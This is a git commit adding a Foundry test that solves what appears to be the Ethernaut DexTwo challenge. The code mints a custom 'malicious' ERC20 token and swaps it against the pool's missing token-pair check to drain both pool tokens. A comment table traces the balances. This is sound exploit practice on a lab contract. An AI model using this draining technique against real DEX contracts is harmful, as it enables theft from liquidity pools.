c13999a66121c557677c9648cb8db79ec87f85dd
Sebastian T F <sebastian.tharakan97@gmail.com>
2023-02-20 11:34:39 +0530

    feat: 🧪 add hack for `DexTwo`

--- test/DexTwo.t.sol
+++ test/DexTwo.t.sol
@@ -8,7 +8,17 @@ import "../src/metrics/Statistics.sol";
 import "../src/levels/DexTwoFactory.sol";
 import "../src/levels/DexTwo.sol";
 
-import {IERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
+import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
+
+contract M is ERC20 {
+    constructor(string memory name_, string memory symbol_)
+        ERC20(name_, symbol_)
+    {}
+
+    function mint(address account, uint256 amount) public {
+        _mint(account, amount);
+    }
+}
 
 contract DexTwoTest is Test {
     using stdStorage for StdStorage;
@@ -64,6 +74,49 @@ contract DexTwoTest is Test {
         DexTwo instance = DexTwo(payable(instanceAddress));
 
         /* Level Hack */
+        // Very similar to Dex challenge
+        // Restrictions on using different tokens is removed
+        // We can mint our own token and transfer them to the pool to increase its balance
+        // Thus when we get more tokens than whats available in the pool, we can drain the opposite token, just as we did in last challenge
+        // Let M be the malicious token
+        // | User Balance - A | User Balance - B | User Balance - M | Pool Balance - A | Pool Balance - B | Pool Balance - M | Swap | swapAmount |
+        // | ---------------- | ---------------- | ---------------- | ---------------- | ---------------- | ---------------- | ---- | ---------- |
+        // | 10               | 10               | 200              | 100              | 100              | 10               | 10 M | 100 A      |
+        // | 110              | 10               | 190              | 0                | 100              | 20               | 20 M | 100 B      |
+        // | 110              | 110              | 170              | 0                | 0                | 40               | 20 M | 100 B      |
+
+        IERC20(instance.token1()).approve(address(instance), type(uint256).max);
+        IERC20(instance.token2()).approve(address(instance), type(uint256).max);
+
+        M m = new M("M", "M");
+        m.mint(address(eoa), 210);
+        m.transfer(address(instance), 10);
+        m.approve(address(instance), type(uint256).max);
+
+        address from = address(m);
+        address to = instance.token1();
+
+        instance.swap(
+            address(m),
+            instance.token1(),
+            m.balanceOf(address(instance))
+        );
+        instance.swap(
+            address(m),
+            instance.token2(),
+            m.balanceOf(address(instance))
+        );
+
+        uint256 poolBalanceToken1 = IERC20(instance.token1()).balanceOf(
+            address(instance)
+        );
+        emit log_named_uint("poolBalanceToken1", poolBalanceToken1);
+        assertTrue(poolBalanceToken1 == 0);
+        uint256 poolBalanceToken2 = IERC20(instance.token2()).balanceOf(
+            address(instance)
+        );
+        emit log_named_uint("poolBalanceToken2", poolBalanceToken2);
+        assertTrue(poolBalanceToken2 == 0);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
